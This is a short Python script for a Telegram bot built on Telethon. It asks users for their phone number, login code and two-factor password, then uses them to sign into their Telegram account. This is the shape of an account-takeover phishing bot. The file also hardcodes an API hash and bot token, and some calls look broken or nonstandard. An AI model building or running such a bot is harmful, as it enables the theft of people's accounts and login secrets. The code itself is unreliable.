




from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeeded, PhoneCodeInvalid
import asyncio

api_id = 10247139  # Replace with your API ID
api_hash = "96b46175824223a33737657ab943fd6a"  # Replace with your API Hash
bot_token = "7293653178:AAGcJSttQbNUK0ORBmf6G9yy7LBLsxuU_k8"  # Replace with your Bot Token

# Create a new Telegram client
client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# Dictionary to store user data
user_data = {}

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond("Welcome! Please enter your phone number in the format +123456789.")
    raise events.StopPropagation  # Prevent further handling of this event

@client.on(events.NewMessage)
async def handle_phone_number(event):
    user_id = event.sender_id

    if user_id not in user_data:
        phone_number = event.message.message.strip()
        user_data[user_id] = {"phone_number": phone_number}

        try:
            # Send the OTP
            sent_code_info = await client.send_code_request(phone_number)
            user_data[user_id]["sent_code_info"] = sent_code_info
            await event.respond("OTP sent! Please enter the code you received.")
        except Exception as e:
            await event.respond(f"Error sending OTP: {str(e)}")
    else:
        # Handle OTP input
        phone_code = event.message.message.strip()
        sent_code_info = user_data[user_id]["sent_code_info"]

        try:
            await client.sign_in(user_data[user_id]["phone_number"], sent_code_info.phone_code_hash, phone_code)
            await event.respond("You are now logged in!")
            await client.send_message("me", "That's work!")  # Checking work
        except SessionPasswordNeeded:
            password = await client.ask(event.chat_id, "Please enter your password:")
            try:
                await client.sign_in(password=password.text)
                await event.respond("You are now logged in!")
                await client.send_message("me", "That's work!")  # Checking work
            except Exception as e:
                await event.respond(f"Error: {str(e)}")
        except PhoneCodeInvalid:
            await event.respond("Invalid code. Please try again.")

# Run the bot
async def main():
    await client.start()
    print("Bot is running...")
    await client.run_until_disconnected()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
